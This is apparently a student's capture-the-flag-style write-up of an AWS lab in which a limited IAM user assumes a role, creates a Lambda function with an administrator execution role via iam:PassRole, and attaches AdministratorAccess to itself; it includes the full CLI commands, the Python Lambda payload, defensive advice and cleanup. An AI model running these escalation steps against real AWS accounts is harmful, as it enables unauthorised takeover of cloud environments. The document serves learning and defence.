# Lambda Privilege Escalation Lab Solution

# Challenge Objective

The objective of this challenge was to acquire full administrator privileges starting as the limited IAM user named:

chris-lambda_privesc

The final proof was showing that the AWS managed AdministratorAccess policy was successfully attached to the starting user Chris.

The final proof was:

AdministratorAccess attached to chris-lambda_privesc

The final screenshot shows that the IAM user chris-lambda_privesc has the following permission policy attached directly:

AdministratorAccess

---

# Step-by-Step Solution

To complete the challenge, I took the following steps:

## a. I reviewed the Terraform files and understood the challenge resources

I started by reviewing the Terraform files in the challenge repository, especially:

iam.tf  
outputs.tf  
provider.tf  
variables.tf  

From the Terraform files, I understood that the lab created the following main resources:

1. A limited IAM user called Chris
2. A customer managed policy attached to Chris
3. An IAM role called lambdaManager
4. A customer managed policy attached to lambdaManager
5. A high-privilege IAM role called debug
6. AdministratorAccess attached to the debug role

The most important discovery was in the IAM permissions.

The Chris user did not have direct administrator permissions. Chris only had IAM read permissions and permission to assume one role.

The important permissions for Chris were:

iam:Get*  
iam:List*  
sts:AssumeRole  

The role that Chris could assume was:

lambdaManager-role-lambda_privesc

The lambdaManager role had the following important permissions:

lambda:*  
iam:PassRole  

The debug role had AdministratorAccess attached to it.

The most important idea was that Chris could not become admin directly, but Chris could assume the lambdaManager role. Then the lambdaManager role could create a Lambda function and pass the powerful debug role to that Lambda function. When the Lambda function ran, it used the permissions of the debug role and attached AdministratorAccess to Chris.

---

## b. I deployed the challenge environment using Terraform

I deployed the lab environment using Terraform from the forked repository.

The commands I used were:

```powershell
terraform init
terraform plan
terraform apply
```

Terraform created the challenge resources successfully.

The output showed:

```text
Apply complete! Resources: 9 added, 0 changed, 0 destroyed.
```

Important outputs from Terraform were:

AWS Account ID:

```text
505284749128
```

Region:

```text
us-east-1
```

Starting user:

```text
chris-lambda_privesc
```

Lambda Manager role:

```text
arn:aws:iam::505284749128:role/lambdaManager-role-lambda_privesc
```

Debug role:

```text
arn:aws:iam::505284749128:role/debug-role-lambda_privesc
```

Scenario goal:

```text
Acquire full admin privileges starting as the low-privileged Chris user
```

This confirmed that the lab environment was created successfully.

---

## c. I configured the Chris attacker profile

After Terraform created the resources, I configured the AWS CLI profile for the Chris IAM user.

First, I retrieved the Chris access key ID and secret access key from Terraform output.

The commands were:

```powershell
terraform output chris_access_key_id
terraform output -raw chris_secret_access_key
```

Then I configured the AWS CLI profile:

```powershell
aws configure --profile chris
```

I entered the Chris access key and secret key from Terraform output.

Then I verified that I was using the Chris identity.

The command was:

```powershell
aws sts get-caller-identity --profile chris
```

The output showed that I was using the Chris IAM user:

```text
arn:aws:iam::505284749128:user/chris-lambda_privesc
```

This step was important because the challenge had to be solved as the limited Chris user, not as the admin deployment user.

---

## d. I listed the policies attached to Chris

Next, I listed the policies attached to the Chris IAM user.

The command was:

```powershell
aws iam list-attached-user-policies --user-name chris-lambda_privesc --profile chris
```

The output showed that Chris had one policy attached:

```text
chris-policy-lambda_privesc
```

This confirmed that Chris only had the challenge policy at the beginning and did not yet have AdministratorAccess.

---

## e. I inspected Chris's IAM policy

After finding the policy attached to Chris, I inspected the policy document.

The commands were:

```powershell
$ChrisPolicyArn = "arn:aws:iam::505284749128:policy/chris-policy-lambda_privesc"

$Version = aws iam get-policy `
  --policy-arn $ChrisPolicyArn `
  --profile chris `
  --query "Policy.DefaultVersionId" `
  --output text

aws iam get-policy-version `
  --policy-arn $ChrisPolicyArn `
  --version-id $Version `
  --profile chris
```

The policy showed that Chris had the following permissions:

```text
iam:Get*
iam:List*
sts:AssumeRole
```

The sts:AssumeRole permission was limited to this role:

```text
arn:aws:iam::505284749128:role/lambdaManager-role-lambda_privesc
```

This was an important discovery because it showed that Chris could not directly attach AdministratorAccess to himself. Chris could only read IAM information and assume the lambdaManager role.

---

## f. I assumed the lambdaManager role

Next, I used Chris's sts:AssumeRole permission to assume the lambdaManager role.

The command was:

```powershell
$LambdaManagerRoleArn = "arn:aws:iam::505284749128:role/lambdaManager-role-lambda_privesc"

$Session = aws sts assume-role `
  --role-arn $LambdaManagerRoleArn `
  --role-session-name chris-lambda-manager `
  --profile chris | ConvertFrom-Json
```

This command returned temporary security credentials for the lambdaManager role.

I saved those temporary credentials into a new AWS CLI profile called lambda-manager-session.

The commands were:

```powershell
aws configure set aws_access_key_id $Session.Credentials.AccessKeyId --profile lambda-manager-session
aws configure set aws_secret_access_key $Session.Credentials.SecretAccessKey --profile lambda-manager-session
aws configure set aws_session_token $Session.Credentials.SessionToken --profile lambda-manager-session
aws configure set region us-east-1 --profile lambda-manager-session
aws configure set output json --profile lambda-manager-session
```

Then I verified that the role assumption worked.

The command was:

```powershell
aws sts get-caller-identity --profile lambda-manager-session
```

The output showed:

```text
arn:aws:sts::505284749128:assumed-role/lambdaManager-role-lambda_privesc/chris-lambda-manager
```

This confirmed that Chris successfully assumed the lambdaManager role.

---

## g. I understood why the lambdaManager role was dangerous

The lambdaManager role was dangerous because it had two important permissions:

```text
lambda:*
iam:PassRole
```

The lambda:* permission allowed the role to create, configure, and invoke Lambda functions.

The iam:PassRole permission allowed the role to pass the debug role to a Lambda function.

The debug role was dangerous because it had AdministratorAccess attached.

The debug role also trusted the Lambda service, meaning a Lambda function could run using this role.

This created the privilege escalation path:

Chris could assume lambdaManager.  
lambdaManager could create a Lambda function.  
lambdaManager could pass the debug role to that Lambda function.  
The Lambda function could run with AdministratorAccess.  
The Lambda function could attach AdministratorAccess to Chris.  

This was the main vulnerability in the lab.

---

## h. I created the Lambda payload

Next, I created a folder for the Lambda payload.

The commands were:

```powershell
mkdir lambda_payload
cd lambda_payload
```

Inside this folder, I created a Python file named:

```text
lambda_function.py
```

The Lambda code was:

```python
import json
import boto3

def lambda_handler(event, context):
    iam = boto3.client("iam")

    user_name = event.get("user_name")
    policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"

    iam.attach_user_policy(
        UserName=user_name,
        PolicyArn=policy_arn
    )

    return {
        "statusCode": 200,
        "body": json.dumps({
            "message": f"AdministratorAccess attached to {user_name}"
        })
    }
```

The purpose of this code was to attach the AWS managed AdministratorAccess policy to the user provided in the event input.

In this challenge, the target user was:

```text
chris-lambda_privesc
```

The important API call in the code was:

```text
iam.attach_user_policy
```

This API call attached AdministratorAccess to Chris.

Then I compressed the Lambda code into a zip file.

The command was:

```powershell
Compress-Archive -Path lambda_function.py -DestinationPath function.zip -Force
```

Then I returned to the main project folder:

```powershell
cd ..
```

---

## i. I created the Lambda function using the debug role

After preparing the Lambda payload, I created a Lambda function using the assumed lambdaManager profile.

The command was:

```powershell
aws lambda create-function `
  --function-name privesc-lambda `
  --runtime python3.12 `
  --role arn:aws:iam::505284749128:role/debug-role-lambda_privesc `
  --handler lambda_function.lambda_handler `
  --zip-file fileb://lambda_payload/function.zip `
  --profile lambda-manager-session `
  --region us-east-1
```

The Lambda function was created successfully.

The function name was:

```text
privesc-lambda
```

The important part of the command was:

```text
--role arn:aws:iam::505284749128:role/debug-role-lambda_privesc
```

This meant that the Lambda function would run using the debug role.

The debug role had AdministratorAccess, so the Lambda function would have administrator-level permissions when it executed.

---

## j. I confirmed that the Lambda function was active

After creating the Lambda function, I checked that the function was active.

The command was:

```powershell
aws lambda get-function `
  --function-name privesc-lambda `
  --profile lambda-manager-session `
  --region us-east-1 `
  --query "Configuration.State"
```

The output showed:

```text
"Active"
```

This confirmed that the Lambda function was ready to be invoked.

---

## k. I created the event input for the Lambda function

Next, I created an event file named:

```text
event.json
```

The content of the file was:

```json
{
  "user_name": "chris-lambda_privesc"
}
```

This event told the Lambda function which IAM user should receive AdministratorAccess.

In this case, the target user was:

```text
chris-lambda_privesc
```

---

## l. I invoked the Lambda function

After creating the event input, I invoked the Lambda function.

The command was:

```powershell
aws lambda invoke `
  --function-name privesc-lambda `
  --payload fileb://event.json `
  --cli-binary-format raw-in-base64-out `
  --profile lambda-manager-session `
  --region us-east-1 `
  response.json
```

Then I checked the Lambda response.

The command was:

```powershell
Get-Content response.json
```

The output showed:

```json
{"statusCode": 200, "body": "{\"message\": \"AdministratorAccess attached to chris-lambda_privesc\"}"}
```

This confirmed that the Lambda function ran successfully and attached AdministratorAccess to Chris.

---

## m. I verified that Chris had AdministratorAccess

After invoking the Lambda function, I verified the policies attached to Chris again.

The command was:

```powershell
aws iam list-attached-user-policies `
  --user-name chris-lambda_privesc `
  --profile chris
```

The output showed two attached policies:

```text
AdministratorAccess
chris-policy-lambda_privesc
```

This confirmed that the starting user Chris now had full administrator privileges.

The AdministratorAccess policy ARN was:

```text
arn:aws:iam::aws:policy/AdministratorAccess
```

This completed the challenge.

The final proof was also verified in the AWS Console by opening:

IAM → IAM users → chris-lambda_privesc → Permissions

The console showed that AdministratorAccess was directly attached to the Chris user.

Screenshot taken:

```text
admin-access-attached-to-chris.png
```

---

# Attack Path Summary

My attack path was:

```text
Chris IAM user
        ↓
No direct administrator permissions
        ↓
Enumerated Chris's attached IAM policy
        ↓
Found iam:Get*, iam:List*, and sts:AssumeRole permissions
        ↓
Used sts:AssumeRole to assume lambdaManager-role-lambda_privesc
        ↓
lambdaManager had lambda:* and iam:PassRole
        ↓
Created a Lambda function using the debug-role-lambda_privesc execution role
        ↓
debug-role-lambda_privesc had AdministratorAccess
        ↓
Invoked the Lambda function
        ↓
Lambda function attached AdministratorAccess to Chris
        ↓
Chris became an administrator
```

The key point is that Chris could not become administrator directly. Instead, Chris used role assumption and Lambda PassRole abuse to indirectly run administrator-level IAM actions through the debug role.

---

![AdministratorAccess attached to Chris](admin-access-attached-to-chris.png)

---

# Reflection

## What was your approach?

My approach started by reviewing the Terraform files to understand what resources were created by the lab.

I looked mainly at the IAM configuration because this was an IAM and Lambda privilege escalation challenge. I identified the starting IAM user, the assumable role, and the high-privilege debug role.

First, I deployed the lab using Terraform. Then I configured the AWS CLI profile for Chris and confirmed that I was using the limited Chris identity.

After that, I inspected Chris's permissions. I found that Chris only had IAM read permissions and sts:AssumeRole. This showed that Chris could not directly attach AdministratorAccess to himself.

Then I used the sts:AssumeRole permission to assume the lambdaManager role. After assuming this role, I found that it had full Lambda permissions and iam:PassRole permission. This led me to use Lambda as the privilege escalation path.

Finally, I created a Lambda function using the debug role as the execution role. Since the debug role had AdministratorAccess, the Lambda function could attach AdministratorAccess to Chris.

---

## What was the biggest challenge?

The biggest challenge was understanding that Chris did not need direct AdministratorAccess permission to become an administrator.

At first, Chris looked like a limited user because Chris only had read permissions and AssumeRole. The important part was realizing that AssumeRole could lead to more permissions through another role.

Another challenge was understanding iam:PassRole. The lambdaManager role itself was not directly shown as AdministratorAccess, but it could pass the debug role to Lambda. Since the debug role had AdministratorAccess, the Lambda function became highly privileged.

It was also important to understand that a Lambda function uses its execution role when it runs. That means the permissions of the debug role were used by the Lambda function, not the permissions of Chris directly.

---

## How did you overcome the challenges?

I overcame the challenges by moving step by step and verifying each stage before continuing.

First, I verified the starting identity using:

```powershell
aws sts get-caller-identity --profile chris
```

Then I listed the policy attached to Chris and inspected the policy document. This helped me understand exactly what Chris could do.

Next, I assumed the lambdaManager role and verified the new identity using:

```powershell
aws sts get-caller-identity --profile lambda-manager-session
```

This confirmed that the role assumption worked.

Then I created the Lambda payload carefully and zipped it. After creating the Lambda function, I checked that the function state was Active before invoking it.

Finally, after invoking the Lambda function, I verified the result by listing Chris's attached policies and checking the AWS Console.

This step-by-step verification helped me avoid confusion and confirmed that each part of the attack path worked.

---

## What led to the breakthrough?

The breakthrough happened when I successfully assumed the lambdaManager role.

The identity output changed from:

```text
arn:aws:iam::505284749128:user/chris-lambda_privesc
```

to:

```text
arn:aws:sts::505284749128:assumed-role/lambdaManager-role-lambda_privesc/chris-lambda-manager
```

This confirmed that Chris could move from a limited IAM user into a more powerful role.

The second breakthrough was successfully creating the Lambda function with the debug execution role.

The key command used this role:

```text
arn:aws:iam::505284749128:role/debug-role-lambda_privesc
```

Since this role had AdministratorAccess, the Lambda function could perform administrator-level actions.

The final confirmation came when the Lambda response showed:

```text
AdministratorAccess attached to chris-lambda_privesc
```

Then the IAM policy listing and AWS Console both showed that AdministratorAccess was attached directly to Chris.

---

## On the blue side, how can the learning be used to properly defend the important assets?

This lab shows that cloud privilege escalation can happen indirectly.

A user may not have AdministratorAccess directly, but the user may still become an administrator if they can assume roles or pass powerful roles to cloud services.

To defend important assets, the following protections should be used:

a. Apply least privilege to all IAM users and roles.

b. Do not attach AdministratorAccess to Lambda execution roles unless absolutely required.

c. Restrict dangerous permissions such as:

```text
iam:PassRole
sts:AssumeRole
lambda:CreateFunction
lambda:UpdateFunctionConfiguration
lambda:InvokeFunction
```

d. Restrict iam:PassRole so users can only pass specific low-privilege roles.

e. Use IAM conditions such as iam:PassedToService to control which AWS services can receive roles.

f. Avoid wildcard permissions such as lambda:* unless there is a strong business reason.

g. Use permission boundaries to prevent users or roles from escalating privileges.

h. Use Service Control Policies in AWS Organizations to block dangerous privilege escalation actions.

i. Monitor CloudTrail logs for suspicious activity such as:

```text
AssumeRole
CreateFunction
PassRole
InvokeFunction
AttachUserPolicy
```

j. Create alerts when AdministratorAccess is attached to a user, role, or group.

k. Create alerts when Lambda functions are created with highly privileged execution roles.

l. Regularly review IAM policies for privilege escalation paths, not just direct admin permissions.

The main lesson is that defenders must review how permissions work together. A permission may not look dangerous by itself, but it can become dangerous when combined with other permissions such as AssumeRole, PassRole, and Lambda function creation.

---

# Cleanup

Before destroying the Terraform resources, I deleted the manually created Lambda function.

The command was:

```powershell
aws lambda delete-function `
  --function-name privesc-lambda `
  --profile lambda-manager-session `
  --region us-east-1
```

Then I detached AdministratorAccess from Chris.

The command was:

```powershell
aws iam detach-user-policy `
  --user-name chris-lambda_privesc `
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess `
  --profile chris
```

Finally, I destroyed the Terraform resources.

The command was:

```powershell
terraform destroy
```

I typed yes when Terraform asked for confirmation.

I did not run cleanup until after collecting all required screenshots and evidence for the submission.

---